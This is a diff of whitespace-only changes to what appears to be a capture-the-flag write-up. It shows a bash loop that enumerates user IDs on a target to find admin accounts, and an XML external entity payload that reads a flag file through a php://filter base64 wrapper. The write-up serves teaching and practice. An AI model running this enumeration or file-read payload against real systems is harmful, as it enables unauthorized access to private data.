@@ -67,12 +67,12 @@ RESET="\e[0m"
 
 # Loop through user IDs
 for uid in {1..100}; do
-    RESPONSE=$(curl -s "$TARGET$uid" -H "User-Agent: $USER_AGENT")
-    
-    if echo "$RESPONSE" | grep -iq "admin"; then
-        echo -e "${GREEN}[+] Admin Found! UID: $uid${RESET}"
-        echo "$RESPONSE" | tee -a "$OUTPUT_FILE"
-    fi
+ RESPONSE=$(curl -s "$TARGET$uid" -H "User-Agent: $USER_AGENT")
+ 
+ if echo "$RESPONSE" | grep -iq "admin"; then
+ echo -e "${GREEN}[+] Admin Found! UID: $uid${RESET}"
+ echo "$RESPONSE" | tee -a "$OUTPUT_FILE"
+ fi
 
 done
 
@@ -160,14 +160,14 @@ We can read the contents of our flag using the following payload:
 ```xml
 <!DOCTYPE name [
 
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
 
 ]>
-            <root>
-            <name>&xxe;</name>
-            <details>1</details>
-            <date>0001-11-11</date>
-            </root>
+ <root>
+ <name>&xxe;</name>
+ <details>1</details>
+ <date>0001-11-11</date>
+ </root>
 ```
 
 In this case, since we know the `name` is vulnerable, we can define an entity and then use it, this displays the following:
